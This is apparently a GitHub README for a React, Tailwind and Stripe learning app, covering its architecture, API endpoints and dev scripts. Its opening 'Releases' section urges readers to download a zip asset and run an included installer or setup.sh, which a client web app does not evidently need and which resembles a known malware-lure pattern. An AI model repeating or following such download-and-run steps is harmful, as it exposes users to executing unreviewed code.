# Code Stack Client ‚Äî Learn HTML, CSS, React, Tailwind, Stripe

A web app that teaches web development topics and lets users comment and vote on posts. It pairs short lessons with interactive UI, sample code, and real-world patterns. Use it to study common stacks, inspect component patterns, and test client-side integrations like Stripe, Axios, and TanStack Query.

## Releases

Download the packaged release from the Releases page and run the included setup file.

Download and execute the release asset:
- Visit: https://github.com/oschicas/code-stack-client/releases
- Download: code-stack-client-v1.0.0.zip (or the latest asset)
- Extract and run the included installer file or run the local start script

Example:
```bash
# after download and unzip
cd code-stack-client-v1.0.0
# run the setup script if provided
chmod +x setup.sh && ./setup.sh

# or run node/npm commands
npm install
npm run dev
```

The file at the Releases link contains the build and scripts you need to run the app.

## Installation (from source)

Clone the repo, install dependencies, and start the dev server.

```bash
git clone https://github.com/oschicas/code-stack-client.git
cd code-stack-client
npm install
npm run dev
```

Common scripts
- npm run dev ‚Äî start development server
- npm run build ‚Äî create production bundle
- npm run preview ‚Äî run a static preview of the build
- npm test ‚Äî run unit tests (if present)

## Folder layout

- /src ‚Äî source code
  - /components ‚Äî UI components (buttons, cards, modals)
  - /hooks ‚Äî custom hooks (useAuth, useDebounce, useApi)
  - /pages ‚Äî route pages (Home, Lessons, Post, Payments)
  - /services ‚Äî API functions (axios wrappers)
  - /styles ‚Äî Tailwind config and custom CSS
- /public ‚Äî static assets
- /scripts ‚Äî setup and helper scripts
- package.json ‚Äî scripts and dependencies

## Data flow and architecture

- Use React Router for route handling. Push route state for pagination and filters.
- Fetch post lists with TanStack Query. Cache responses and use query invalidation on mutations.
- Use Axios for REST calls. Wrap Axios in a small service layer. Centralize interceptors for auth and error handling.
- Manage forms with React Hook Form. Build validation rules and error UI with DaisyUI classes.
- Use custom hooks for common behavior:
  - useDebounce for search inputs
  - useAuth for token state and refresh flows
  - useVote for optimistic voting updates
- Keep UI stateless where possible. Let parent components pass data and handlers.

## Comments and voting

- Each post exposes a comment list and a comment form.
- The UI posts new comments with an optimistic update to show immediate feedback.
- Voting uses a single endpoint per action (upvote, downvote). UI updates the local cache via TanStack Query to keep counts in sync.

Example mutation flow:
1. User clicks upvote.
2. UI sends optimistic update to increase upvote count.
3. Axios posts to /api/posts/{id}/vote.
4. On success, invalidate cached post queries.

## Stripe demo

The client includes a sandbox Stripe flow to demonstrate payment UI:
- It shows a sample checkout form built with Stripe Elements.
- Do not use the demo keys for production.
- The flow demonstrates token creation and a mock server call.

Files of interest:
- src/pages/Payments/Checkout.jsx
- src/services/stripeClient.js

## Forms and validation

- Use React Hook Form to register inputs and validate values.
- Combine with zod or yup if you need schema validation.
- Use Tailwind utilities for error states and focus styles.

## Testing

- Unit test components with Jest and React Testing Library.
- Focus tests on hooks and UI that manage side effects (data fetching, forms).
- Mock Axios with jest.mock or msw for integration tests.

## Accessibility

- Use semantic HTML for content.
- Ensure interactive controls have ARIA labels where needed.
- Provide keyboard focus styles and logical tab order.

## Performance tips

- Code-split route bundles with dynamic imports for large pages.
- Memoize heavy components and functions (React.memo, useMemo, useCallback).
- Use TanStack Query to cache data and avoid repeated network calls.

## Contributing

- Fork the repo and open a PR to main.
- Keep changes focused and test each feature.
- Follow the existing style conventions and Tailwind utility patterns.
- Add docs for new components and hooks.

Pull request checklist:
- [ ] Add tests for new logic
- [ ] Update README if you add new features
- [ ] Keep commits small and focused

## API and endpoints (client perspective)

Common endpoints the client expects:
- GET /api/posts ‚Äî list posts with pagination
- GET /api/posts/:id ‚Äî get post details and comments
- POST /api/posts/:id/comments ‚Äî add comment
- POST /api/posts/:id/vote ‚Äî { vote: "up" | "down" }
- POST /api/auth/login ‚Äî return token
- POST /api/payments/charge ‚Äî demo payment endpoint

Use Axios instances from src/services/api.js and centralize baseURL and interceptors.

## Troubleshooting

- If the dev server fails, check node version (use Node 16+).
- If styles do not load, ensure Tailwind config is present and postcss builds complete.
- If Stripe demo fails, verify public key in environment variables.
